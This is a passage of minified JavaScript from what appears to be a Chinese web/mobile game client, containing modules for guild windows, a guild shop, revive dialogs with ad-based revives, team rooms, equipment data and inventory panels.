t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.btnAllSoul,this.onClick),this.addTouchEvent(this.btnGuildBattle,this.onClick),this.addTouchEvent(this.shopBtn,this.onClick),this.addTouchEvent(this.practiseBtn,this.onClick),this.addTouchEvent(this.manageBtn,this.onClick),observe(this,this.hhdtRed,s.RedPointBaseSys.ins().RpChange),observe(this,this.hhdtRed,g.GuildSoulsRedPoint.ins().postRedPoint),this.hhdtRed(),observe(this,this.updateList,C.Guild.ins().postGuildMembers),this.updateList(),observe(this,this.updateGuild,C.Guild.ins().postGuildInfo,C.Guild.ins().postChangeNotice,C.Guild.ins().postGuildMoney,C.Guild.ins().postMyGuildInfo),this.updateGuild(),observe(this,this.updateMember,C.Guild.ins().postGuildMembers),this.updateMember(),this.updateSoulTime()},e.prototype.hhdtRed=function(){this.manageBtn.eRp&&(this.manageBtn.eRp.visible=T.GuildRP.ins().memberRp.v),this.practiseBtn.eRp&&(this.practiseBtn.eRp.visible=T.GuildRP.ins().fireRp.v),this.checkJoin.visible&&this.checkJoin.eRp&&(this.checkJoin.eRp.visible=T.GuildRP.ins().applyRp.v),this.btnGuildBattle.imgRp.visible=h.GuildBattleCT.ins().dailyRewardRp.v||h.GuildBattleCT.ins().rewardAllotRp.v||h.GuildBattleCT.ins().enterRp.v,this.btnAllSoul.imgRp.visible=g.GuildSoulsRedPoint.ins().redPoint},e.prototype.tabRp=function(){return h.GuildBattleCT.ins().enterRp.v||h.GuildBattleCT.ins().dailyRewardRp.v||h.GuildBattleCT.ins().rewardAllotRp.v||T.GuildRP.ins().applyRp.v||T.GuildRP.ins().memberRp.v||T.GuildRP.ins().fireRp.v||C.Guild.ins().returnNoGuildRep()||g.GuildSoulsRedPoint.ins().redPoint},e.prototype.updateList=function(){this.list.dataProvider=new eui.ArrayCollection(C.Guild.ins().getGuildMembers(2))},e.prototype.onClick=function(t){switch(t.currentTarget){case this.practiseBtn:win.open("GuildSkillWin");break;case this.manageBtn:win.open("GuildWin");break;case this.shopBtn:win.open("GuildShopPanel");break;case this.btnAllSoul:win.open("GuildSoulsLandPanel");break;case this.btnGuildBattle:if(!d.OpenSystem.ins().checkSysOpen(r.SystemType.GuildBattle))return void m.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(r.SystemType.GuildBattle));win.open(u.GuildBattleWin)}},e.prototype.onTap=function(t){switch(t.target){case this.cityBtn:win.open("GuildWarMainWin");break;case this.chatBtn:win.open("ChatWin");break;case this.cityBtn1:win.open("GuildNoticeWin");break;case this.rename:win.open("GuildChangeNameView");break;case this.checkJoin:win.open("GuildApplyListWin")}},e.prototype.updateSoulTime=function(){f.GuildSoulsLandCT.ins().initActTimer(),this.soulTimes=Math.ceil(.001*(f.GuildSoulsLandCT.ins().closeTimes-c.GameServerCC.serverTime)),Timer.has(this.flusSoulLeftTime,this)||Timer.start(1e3,-1,this.flusSoulLeftTime,this),this.flusSoulLeftTime()},e.prototype.flusSoulLeftTime=function(){this.soulTimes--,this.soulTimes<=0?this.btnAllSoul.closetime&&(this.btnAllSoul.closetime.text="-"):this.btnAllSoul.closetime&&(this.btnAllSoul.closetime.text=n.DateUtils.getFormatBySecond(this.soulTimes,n.DateUtils.TIME_FORMAT_5,4))},e.prototype.updateGuild=function(){this.guildName.text=C.Guild.ins().guildName,this.guildLevel.textFlow=I.TextFlowMaker.generateTextFlow1(gettext("等级：|C:0xE7BF6E&T:{0}|",C.Guild.ins().guildLv.toString())),this.guildMoney.textFlow=I.TextFlowMaker.generateTextFlow1(gettext("资金：|C:0xE7BF6E&T:{0}|",C.Guild.ins().money.toString())),this.notice.text=C.Guild.ins().notice?C.Guild.ins().notice:a.GlobalConfig.GuildConfig.defaultMemo,this.rename.visible=C.Guild.ins().changeNameNum&&C.Guild.ins().myOffice>=y.GuildOffice.GUILD_BANGZHU,this.checkJoin.visible=C.Guild.ins().myOffice>=y.GuildOffice.GUILD_FUBANGZHU,this.cityBtn1.visible=C.Guild.ins().myOffice==y.GuildOffice.GUILD_BANGZHU,this.lab.text=""+l.ActorCC.guildNum,this.hzname.textFlow=I.TextFlowMaker.generateTextFlow1(gettext("会长：|C:0xE7BF6E&T:{0}|",C.Guild.ins().hzName||""))},e.prototype.updateMember=function(){var t=a.GlobalConfig.GuildConfig,e=C.Guild.ins().getBuildingLevels(v.GuildBuilding.GUILD_COMMENT-1)||0,i=e?a.GlobalConfig.GuildConfig.affairMember[e-1]:0;this.guildMember.textFlow=I.TextFlowMaker.generateTextFlow1(gettext("人数：|C:0xE7BF6E&T:{0}|",C.Guild.ins().getMemberNum()+"/"+(t.maxMember[C.Guild.ins().guildLv-1]+i)))},e}(o.BaseView);e.GuildMap=S,window.GuildMap=S,__reflect(S.prototype,"GuildMap",[]),window.GuildMap=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(4),r=i(28),l=i(67),h=i(2),u=i(51),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.tab,this.onTabTouch),this.addChangingEvent(this.tab,this.onTabTouching)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tab.selectedIndex=this.viewStack.selectedIndex=0,u.GuildBattleCT.ins().reqWinGuildInfo();var i=n.DateUtils.countNextWeekTimes(4,10,30),o=n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_13);console.log("timeDesc,",o)},e.prototype.onTabTouching=function(t){return this.checkIsOpen(t.currentTarget.selectedIndex)?void 0:void t.preventDefault()},e.prototype.onTabTouch=function(t){this.setOpenIndex(t.currentTarget.selectedIndex)},e.prototype.setOpenIndex=function(t){console.log("---sel index---",t)},e.prototype.checkIsOpen=function(t){switch(t){case e.PAGE_SEL_MAIN_VIEW:break;case e.PAGE_SEL_LAST_WAR_VIEW:break;case e.PAGE_SEL_REWARD_VIEW:}return!0},e.prototype.tabRp=function(){return u.GuildBattleCT.ins().enterRp.v||u.GuildBattleCT.ins().dailyRewardRp.v||u.GuildBattleCT.ins().rewardAllotRp.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return a.ActorCC.level<s.GlobalConfig.GuildConfig.openLevel?(h.TipsCT.ins().showTips(gettext("{0}级开启",s.GlobalConfig.GuildConfig.openLevel)),win.open(l.View_BianQiang,2),!1):r.Guild.ins().guildID?!0:(win.open("GuildApplyWin"),!1)
},e.PAGE_SEL_MAIN_VIEW=0,e.PAGE_SEL_LAST_WAR_VIEW=1,e.PAGE_SEL_REWARD_VIEW=2,e}(o.BaseView);e.GuildBattleWin=p,window.GuildBattleWin=p,__reflect(p.prototype,"GuildBattleWin",[]),window.GuildBattleWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildStore=void 0;var n=i(14),o=function(t){function e(){var e=t.call(this)||this;return e.GuildShop={},e.sysId=PackageID.GuildStore,e.regNetMsg(4,e.postGuildStore),e.regNetMsg(5,e.postGuildCb),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postGuildStore=function(t){for(var e=t.readInt(),i=0;e>i;i++){var n=t.readInt(),o=t.readInt();this.GuildShop[n]?this.GuildShop[n].count=o:this.GuildShop[n]={id:n,count:o}}},e.prototype.postGuildCb=function(t){var e=t.readInt(),i=t.readInt();this.GuildShop[e]?this.GuildShop[e].count=i:this.GuildShop[e]={id:e,count:i}},e.prototype.sendInfo=function(){var t=this.getBytes(4);this.sendToServer(t)},e.prototype.sendBuy=function(t,e){var i=this.getBytes(5);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},__decorate([post()],e.prototype,"postGuildStore",null),__decorate([post()],e.prototype,"postGuildCb",null),e}(n.BaseSystem);e.GuildStore=o,window.GuildStore=o,__reflect(o.prototype,"GuildStore",[]),Systemap.GuildStore=function(){return o.ins()},window.GuildStore=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RandomItemData=void 0;var n=function(){function t(){}return t}();e.RandomItemData=n,window.RandomItemData=n,__reflect(n.prototype,"RandomItemData",[]),window.RandomItemData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ReliveWin=void 0;var n=i(1),o=i(42),s=i(2),a=i(0),r=i(53),l=i(23),h=i(30),u=i(25),p=i(19),d=i(32),c=i(20),f=i(90),g=i(61),m=i(7),v=i(8),y=i(85),C=i(124),T=i(43),b=i(79),w=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ReliveSkin",e.rectClose=!1,e.adCount=0,e.remainM=15,e.miao=15,e}return __extends(e,t),e.prototype.skinComplete=function(){var t=this;l.GameLogic.ins().sendAdFhCount(),observe(this,this.updateFhCount,l.GameLogic.ins().doAdFhCount),observe(this,this.cbFh,l.GameLogic.ins().postAdReward),this.addTouchEvent(this.eB0,function(){T.CityCC.ins().isBianQiang=!0,c.GameMap.fbType==d.FbCT.FB_KF||c.GameMap.fbType==d.FbCT.FB_TYPE_DEVILDOM_BOSS||c.GameMap.fbType==d.FbCT.FB_TYPE_LIU_DAO_LUN_HUI?(b.SixReisCT.ins().clearInfo(),send(Ts.exitFB)):send(Ts.relive),win.close(t)}),this.addTouchEvent(this.eB1,function(){return __awaiter(t,void 0,void 0,function(){var t,e;return __generator(this,function(i){switch(i.label){case 0:return t=a.GlobalConfig.RoleBaseConfig.rebornItem2,p.GlobalFun.checkCost(t.count,t.id)?(Timer.has(this.timeCb,this)&&Timer.stop(this.timeCb,this),this.eCd.text="",[4,sendSync(Ts.relive,1)]):[2];case 1:return e=i.sent(),e?r.ControlCC.setAuto(!0):s.TipsCT.ins().showCenterTips(gettext("复活失败")),[2]}})})}),0==platform.getAdType()||window.platform.isshen()?this.grp_ad.visible=!1:(this.grp_ad.visible=!0,this.eB2.label=1==platform.getAdType()?gettext("广告复活"):gettext("免费复活"),this.addTouchEvent(this.eB2,function(){return t.adCount<=0?void s.TipsCT.ins().showTips(1==platform.getAdType()?gettext("今日广告复活次数已用完"):gettext("今日复活次数已用完")):(Timer.has(t.timeCb,t)&&Timer.stop(t.timeCb,t),t.eCd.text="",2==platform.getAdType()?(l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH),void y.Setting.ins().setValue(y.ClientSet.FuHuo,v.DateUtils.formatServerTime(m.GameServerCC.serverTime))):3==platform.getAdType()?void l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH):u.Recharge.ins().isGotAdPrivilege||f.DeviceUtils.IsPC?void l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH):void window.platform.showAd(function(){l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH)},C.AdType.Relive))}));var e=a.GlobalConfig.RoleBaseConfig,i=(e.rebornItem1,e.rebornItem2);this.eC1.setData(i,!0,!1),this.setTimeLab()},e.prototype.addDisplay=function(t){var e,i=t.killerName,n=t.cd;t.type,t.count;if(n?this.remainM=v.DateUtils.formatMiniDateTime(n):this.remainM=m.GameServerCC.serverTime+1e3*a.GlobalConfig.RoleBaseConfig.rebornCd,i){var s="",r=i.split("_");if("0"==r[0])s=r[1];else{var l=a.GlobalConfig.MonstersConfig[+r[1]];s=l?l.name:""}var h=gettext("你被{0}击败",o.StringUtils.addColor(""+s,"#23C42A"));this.killTips.textFlow=(new egret.HtmlTextParser).parser(h)}this.btnGrp.visible=4!=(null===(e=a.GlobalConfig.InstanceConfig[c.GameMap.fubenID])||void 0===e?void 0:e.rebornType),this.bg.height=this.btnGrp.visible?350:230,Timer.start(200,0,this.timeCb,this)},e.prototype.cbFh=function(t){t&&(r.ControlCC.setAuto(!0),win.close(this))},e.prototype.timeCb=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){return t=m.GameServerCC.serverTime,this.miao=Math.ceil((this.remainM-t)/1e3),this.miao<0?[2]:(this.setTimeLab(),[2])})})},e.prototype.setTimeLab=function(){var t;t=c.GameMap.fbType==d.FbCT.FB_TEAM||c.GameMap.fbType==d.FbCT.FB_TYPE_DEVILDOM_BOSS||c.GameMap.fbType==d.FbCT.FB_TYPE_INVADE||c.GameMap.fbType==d.FbCT.FB_TYPE_QIYU_BOSS?gettext("秒后自动复活"):gettext("秒后自动回城复活"),this.eCd.textFlow=(new egret.HtmlTextParser).parse("<a color=0x45FF7A>"+this.miao+"</a>"+t)},e.prototype.updateFhCount=function(t){if(this.adCount=t||0,2==platform.getAdType()){var e=g.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-v.DateUtils.formatMiniDateTime(y.Setting.ins().getValue(y.ClientSet.FuHuo)));this.eB2.enabled=0>=e,this.updateCountDown(),e>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else 1==platform.getAdType()?this.lab.text=gettext("看广告({0}次)",this.adCount):3==platform.getAdType()&&(this.lab.text=gettext("看广告({0}次)",this.adCount),this.eB2.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.updateCountDown=function(){var t=g.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-v.DateUtils.formatMiniDateTime(y.Setting.ins().getValue(y.ClientSet.FuHuo)));t>0?this.lab.text=v.DateUtils.getFormatBySecond(.001*t,v.DateUtils.TIME_FORMAT_3):(this.lab.text="",this.eB2.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.removeDisplay=function(){Timer.has(this.updateCountDown,this)&&Timer.stop(this.updateCountDown,this),Timer.has(this.timeCb,this)&&Timer.stop(this.timeCb,this)},e}(n.BaseView);e.ReliveWin=w,window.ReliveWin=w,__reflect(w.prototype,"ReliveWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixTeamRoomWin=void 0;var n=i(45),o=i(148),s=i(1),a=i(138),r=i(79),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="sixTrailRoomSkin",e.defaultRect=!1,e._memberArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this._memberArr=[this.leader,this.member1,this.member2]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(r.SixReisCT.ins().postSetTeamInfo,this.update),this.observe(n.ChatCT.ins().postSysChatMsg,this.updateChatList),this.observe(n.ChatCT.ins().postNewChatMsg,this.updateChatList),this.observe(n.ChatCT.ins().postDelMsg,this.updateChatList),this.chatList.itemRenderer=a.ChatListItemRenderer3,this._charInfoArr=new eui.ArrayCollection,this.chatList.dataProvider=this._charInfoArr,this.addTouchEvent(this,this.onTouch),this.update(),this.updateChatList(),0==r.SixReisCT.ins().tfMembers.length?r.SixReisCT.ins().postCreateTeam():r.SixReisCT.ins().postGetTeamInfo()},e.prototype.updateChatList=function(){this._charInfoArr.replaceAll(n.ChatCT.ins().chatListTip2.concat()),this.scr.height=this.chatGroup.height,this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){0!=this.scr.viewport.contentHeight&&(this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height))},e.prototype.update=function(){var t=r.SixReisCT.ins().tfMembers,e=[null,null,null];if(t&&t.length>0)for(var i=0,n=0,o=t.length;o>n;n++)1==t[n].position?e[0]=t[n]:(i++,e[i]=t[n]);for(var n=0,o=this._memberArr.length;o>n;n++)this._memberArr[n].data=e[n];this.leader.visible=!0,this.scr.height=this.eGroup.height,this.refushBarList(),0==r.SixReisCT.ins().tfMembers.length?this.btnExit.label=gettext("创建队伍"):r.SixReisCT.ins().checkMeIsLeader()?this.btnExit.label=gettext("解散队伍"):this.btnExit.label=gettext("退出队伍")},e.prototype.onTouch=function(t){switch(t.target){case this.btnExit:0==r.SixReisCT.ins().tfMembers.length?r.SixReisCT.ins().postCreateTeam():r.SixReisCT.ins().checkMeIsLeader()?(r.SixReisCT.ins().postOutTeam(),win.close(this)):(r.SixReisCT.ins().postOutTeam(),win.close(this));break;case this.eChat:win.open(o.ChatWin);break;case this.eCloss:win.close(this);break;case this.btnChange:r.SixReisCT.ins().postEnterSix(),win.close(this)}},e.prototype.removeDisplay=function(){Timer.stop(this.refushBarList,this),this.skin&&this.removeObserve()},e}(s.BaseView);e.SixTeamRoomWin=l,window.SixTeamRoomWin=l,__reflect(l.prototype,"SixTeamRoomWin",[]),window.SixTeamRoomWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EventType=void 0;var n=function(){function t(){}return t["delete"]="delete",t.CHANGE="change",t.DATA="data",t}();e.EventType=n,window.EventType=n,__reflect(n.prototype,"EventType",[]),window.EventType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ReliveWin2=void 0;var n=i(1),o=i(42),s=i(2),a=i(0),r=i(53),l=i(23),h=i(30),u=i(25),p=i(19),d=i(32),c=i(20),f=i(90),g=i(61),m=i(7),v=i(8),y=i(85),C=i(124),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="Relive2Skin",e.rectClose=!1,e.adCount=0,e.remainM=15,e.miao=15,e}return __extends(e,t),e.prototype.skinComplete=function(){var t=this;l.GameLogic.ins().sendAdFhCount(),observe(this,this.updateFhCount,l.GameLogic.ins().doAdFhCount),observe(this,this.cbFh,l.GameLogic.ins().postAdReward),this.addTouchEvent(this.eB0,function(){c.GameMap.fbType==d.FbCT.FB_KF||c.GameMap.fbType==d.FbCT.FB_TYPE_DEVILDOM_BOSS?send(Ts.exitFB):send(Ts.relive),win.close(t)}),this.addTouchEvent(this.eB1,function(){return __awaiter(t,void 0,void 0,function(){var t,e;return __generator(this,function(i){switch(i.label){case 0:return t=a.GlobalConfig.RoleBaseConfig.rebornItem2,p.GlobalFun.checkCost(t.count,t.id)?(Timer.has(this.timeCb,this)&&Timer.stop(this.timeCb,this),this.eCd.text="",[4,sendSync(Ts.relive,1)]):[2];case 1:return e=i.sent(),e?(r.ControlCC.setAuto(!0),win.close(this)):s.TipsCT.ins().showCenterTips(gettext("复活失败")),[2]}})})}),0==platform.getAdType()||window.platform.isshen()?this.grp_ad.visible=!1:(this.grp_ad.visible=!0,this.eB2.label=1==platform.getAdType()?gettext("广告复活"):gettext("免费复活"),this.addTouchEvent(this.eB2,function(){return t.adCount<=0?void s.TipsCT.ins().showTips(1==platform.getAdType()?gettext("今日广告复活次数已用完"):gettext("今日复活次数已用完")):(Timer.has(t.timeCb,t)&&Timer.stop(t.timeCb,t),t.eCd.text="",2==platform.getAdType()?(l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH),void y.Setting.ins().setValue(y.ClientSet.FuHuo,v.DateUtils.formatServerTime(m.GameServerCC.serverTime))):3==platform.getAdType()?void l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH):u.Recharge.ins().isGotAdPrivilege||f.DeviceUtils.IsPC?void l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH):void window.platform.showAd(function(){l.GameLogic.ins().sendAdReward(h.AD_REWARDTYPE.FH)},C.AdType.Relive))}));var e=a.GlobalConfig.RoleBaseConfig,i=(e.rebornItem1,e.rebornItem2);this.eC1.setData(i,!0,!1),this.setTimeLab()},e.prototype.addDisplay=function(t){var e=t.killerName,i=t.cd;t.type,t.count;if(i?this.remainM=v.DateUtils.formatMiniDateTime(i):this.remainM=m.GameServerCC.serverTime+1e3*a.GlobalConfig.RoleBaseConfig.rebornCd,e){var n="",s=e.split("_");if("0"==s[0])n=s[1];else{var r=a.GlobalConfig.MonstersConfig[+s[1]];n=r?r.name:""}var l=gettext("你被{0}击败",o.StringUtils.addColor(""+n,"#23C42A"));this.killTips.textFlow=(new egret.HtmlTextParser).parser(l)}this.btnGrp.visible=!0,this.bg.height=this.btnGrp.visible?350:230,Timer.start(200,0,this.timeCb,this)},e.prototype.cbFh=function(t){t&&(r.ControlCC.setAuto(!0),win.close(this))},e.prototype.timeCb=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){return t=m.GameServerCC.serverTime,this.miao=Math.ceil((this.remainM-t)/1e3),this.miao<0?[2]:(this.setTimeLab(),[2])})})},e.prototype.setTimeLab=function(){var t=gettext("秒后自动复活");this.eCd.textFlow=(new egret.HtmlTextParser).parse("<a color=0x45FF7A>"+this.miao+"</a>"+t)},e.prototype.updateFhCount=function(t){if(this.adCount=t||0,2==platform.getAdType()){var e=g.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-v.DateUtils.formatMiniDateTime(y.Setting.ins().getValue(y.ClientSet.FuHuo)));this.eB2.enabled=0>=e,this.updateCountDown(),e>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else 1==platform.getAdType()?this.lab.text=gettext("看广告({0}次)",this.adCount):3==platform.getAdType()&&(this.lab.text=gettext("看广告({0}次)",this.adCount),this.eB2.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.updateCountDown=function(){var t=g.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-v.DateUtils.formatMiniDateTime(y.Setting.ins().getValue(y.ClientSet.FuHuo)));t>0?this.lab.text=v.DateUtils.getFormatBySecond(.001*t,v.DateUtils.TIME_FORMAT_3):(this.lab.text="",this.eB2.enabled=!0,Timer.stop(this.updateCountDown,this))},e.prototype.removeDisplay=function(){Timer.has(this.updateCountDown,this)&&Timer.stop(this.updateCountDown,this),Timer.has(this.timeCb,this)&&Timer.stop(this.timeCb,this)},e}(n.BaseView);e.ReliveWin2=T,window.ReliveWin2=T,__reflect(T.prototype,"ReliveWin2",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipsData=void 0;var n=i(40),o=i(207),s=function(){function t(){this.gemDatas=[]}return t.prototype.parser=function(t){this.strengthen=t.readInt(),this.spiritLv=t.readInt(),this.gem=t.readInt(),this.item=new n.ItemData,this.item.parser(t),this.zhuling=t.readInt(),this.soulLv=t.readInt(),this.bless=t.readInt(),this.spiritExp=t.readInt(),this.gemDatas.length=0;for(var e=0;3>e;e++){var i=new o.EquipInlayData;i.parser(t),i.setGemPosition(e),this.gemDatas.push(i)}},t.prototype.getGemLv=function(){},t}();e.EquipsData=s,window.EquipsData=s,__reflect(s.prototype,"EquipsData",[]),window.EquipsData=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangRP=void 0;var n=i(14),o=i(151),s=i(6),a=i(0),r=function(t){function e(){var e=t.call(this)||this;e.erps=[];var i=o.WushuangEquipCT.ins(),n=i.initData,a=i.updateData,r=s.BagCT.ins(),l=r.postItemAdd,h=r.postItemDel,u=r.postItemCountChange;return observe(e,e.updateRed,n,a,l,h,u),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.updateRed=function(){var t=o.WushuangEquipCT.ins().data,e=a.GlobalConfig.PeerlessBaseConfig.initequip;for(var i in t){var n=t[i];this.erps[i]=this.erps[i]||[];for(var r in n)if(n[r][0]){var l=a.GlobalConfig.PeerlessStageConfig[n[r][0]];if(!l){this.erps[i][r]=!1;continue}var h=l.consume[0],u=s.BagCT.ins().getBagItemCount(s.BagCT.BAG_TYPE_OTHTER,h.id);this.erps[i][r]=u>=h.count}else{var p=s.BagCT.ins().getBagItemById(e[r]);this.erps[i][r]=!!p}}},e.prototype.returnWuShuangR=function(){var t=e.ins().erps;if(t)for(var i in t[0])if(t[0][i])return!0;return!1},e.prototype.getRoleRp=function(t){if(void 0===t&&(t=-1),t>-1)return!!~this.erps[t].indexOf(!0);for(var e in this.erps)if(~this.erps[e].indexOf(!0))return!0;return!1},__decorate([post()],e.prototype,"updateRed",null),e}(n.BaseSystem);e.WushuangRP=r,window.WushuangRP=r,__reflect(r.prototype,"WushuangRP",[]),Systemap.WushuangRP=function(){return r.ins()},window.WushuangRP=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagWin2=void 0;var n=i(16),o=i(317),s=i(17),a=i(15),r=i(13),l=i(225),h=i(319),u=i(320),p=i(12),d=i(38),c=i(123),f=i(27),g=i(6),m=i(323),v=i(166),y=i(184),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="bagWin2Skin",e.openIdx=0,e}return __extends(e,t),Object.defineProperty(e,"panelNames",{get:function(){return[y.BagPanel,m.BagCallBackPanel,u.ComposePanel,v.BagEquipIntensifyPanel,l.EquipInlayPanel,h.EquipSacrificePanel]},enumerable:!1,configurable:!0}),e.prototype.addDisplay=function(){this.baseTab=this.eTab,this.baseViewStack=this.eVs,this.open(this.openIdx),this.addChangeEvent(this.eTab,this.onTabTouch),this.RoleInfoPanel.setRoleData(r.SubRoles.ins().getSubRoleByIndex(0)),observe(this,this.updateBtnRp,s.RedPointBaseSys.ins().RpChange),this.eTab.addEventListener(eui.UIEvent.CHANGING,this.CHANGING,this),this.updateBtnRp(),this.initTab()},e.prototype.removeDisplay=function(){this.skin&&(this.removeObserve(),this.removeTouchEvent(this.eTab,this.onTabTouch))},e.prototype.initTab=function(){if(this.eVs&&0!=this.eVs.numElements){var t=this.eVs.getChildIndex(this.EquipInlayPanel);p.OpenSystem.ins().checkSysOpen(a.SystemType.GemSet)||this.eVs.numElements>t&&t>0&&this.eVs.removeChildAt(t)}},e.prototype.open=function(e){void 0===e&&(e=-1);for(var i=[],n=1;n<arguments.length;n++)i[n-1]=arguments[n];if(t.prototype.open.call(this,e,i),1==this.openIdx){var o=this.eVs.getElementAt(this.openIdx);if(!o)return;var s=this.parent.parent;o.openIdx=s.param[2]||0}else if(2==this.openIdx){var o=this.eVs.getElementAt(this.openIdx);if(!o)return;var s=this.parent.parent;o.idx=s.param[2]||0}},e.prototype.updateBtnRp=function(){var t=this.eTab.getElementAt(0);t&&(t.eRp.visible=g.BagCT.ins().callbackRed.v||g.BagCT.ins().redWearBag()||g.BagCT.ins().XinShouLiBao.v||c.ShenFuCT.ins().upRed.v),t=this.eTab.getElementAt(1),t&&(t.eRp.visible=g.BagCT.ins().callbackRed.v)},e.prototype.onTabTouch=function(){},e.prototype.tabRp=function(){return g.BagCT.ins().AllBagRed.v},e.prototype.clearPanel=function(){if(this.eVs&&this.eVs.numElements>0)for(var t=this.eVs.numElements-1;t>=0;t--){var e=this.eVs.getElementAt(t);e&&(e.clearPanel&&e.clearPanel(),n.DisplayUtils.removeFromParent(e))}n.DisplayUtils.removeFromParent(this.eVs),n.DisplayUtils.removeFromParent(this.eTab)},e.prototype.GuideClothes=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideClothes()},e.prototype.GuideWeapon=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideWeapon()},e.prototype.GuideQx=function(){var t;return this.eTab&&(null===(t=this.eTab)||void 0===t?void 0:t.numElements)?this.eTab.getElementAt(3)||null:null},e.prototype.GuideQxBtn=function(){var t=this.eVs.getElementAt(3);if(t)return t.GuideQxBtn()},e.prototype.GuideSf=function(){return this.RoleInfoPanel?this.RoleInfoPanel.GuideSf():void 0},e.prototype.GuideCallBack=function(){var t;return this.eTab&&(null===(t=this.eTab)||void 0===t?void 0:t.numElements)?this.eTab.getElementAt(1)||null:null},e.prototype.CHANGING=function(t){var e,i=this,n=this.eVs.selectedIndex,o=this.eVs.getChildIndex(this.EquipSacrificePanel),s=this.eTab.selectedIndex,a=d.EquipCT.ins().keepSacrifice;a&&a.attArr.length>0&&n==o&&(e=gettext("装备祭炼")),e&&(t.preventDefault(),f.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",e),function(){var t=egret.getQualifiedClassName(i.eVs.getChildAt(s));win.openCheck(egret.getDefinitionByName(t))&&(d.EquipCT.ins().postChangeTabClear(),i.eVs.selectedIndex=s,d.EquipCT.ins().changetabEquip())},this))},e}(o.BaseDuoPanelWin);e.BagWin2=C,window.BagWin2=C,__reflect(C.prototype,"BagWin2",[]),window.BagWin2=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayPanel=void 0;var n=i(19),o=i(5),s=i(1),a=i(0),r=i(13),l=i(6),h=i(140),u=i(2),p=i(27),d=i(63),c=i(104),f=i(687),g=i(688),m=i(318),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EquipInlay",e.idx=-1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listUpGem.itemRenderer=f.EquipInlayItem,this.listUpGem.dataProvider=this.listUpGemArr=new eui.ArrayCollection,this.listUpGem.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.listGem.itemRenderer=m.ItemBase_select,this.listGem.dataProvider=this.listGemArr=new eui.ArrayCollection,this.listSkill.itemRenderer=g.EquipInlaySkillItem,this.listSkill.dataProvider=this.listSkillArr=new 